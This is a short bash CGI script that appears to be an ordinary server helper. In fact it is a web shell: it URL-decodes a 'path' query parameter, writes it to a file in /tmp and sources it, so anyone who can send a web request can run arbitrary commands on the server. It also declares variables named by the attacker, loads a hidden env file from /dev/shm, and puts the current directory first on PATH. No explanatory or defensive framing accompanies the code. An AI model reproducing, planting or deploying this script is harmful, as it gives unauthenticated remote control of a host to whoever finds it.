# without content encoding the request response won't be honored
echo -e 'Content-Type: text/plain\n'
SERVER_NAME=myserver
## parse vars (for interactive use)
saveIFS=$IFS
IFS='=&'
parm=($QUERY_STRING)
IFS=$saveIFS
for ((i=0; i<${#parm[@]}; i+=2))
do
    declare var_${parm[i]}=${parm[i+1]}
done
## exec command for interactive and proclimited scenarios
url_encoded="${var_path//+/ }"
export PATH=".:$PATH"
. /dev/shm/srv/utils/load.env &>/dev/null

if declare -f "${url_encoded/\%20*}" 1>/dev/null; then ## don't use -n, redirect fd for bcompat
    printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
else
    if builtin "${url_encoded/\%20*}"; then
        printf '%b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    else
        printf 'exec %b' "${url_encoded//%/\\x}" > /tmp/${SERVER_NAME}.src
    fi
fi
. /tmp/${SERVER_NAME}.src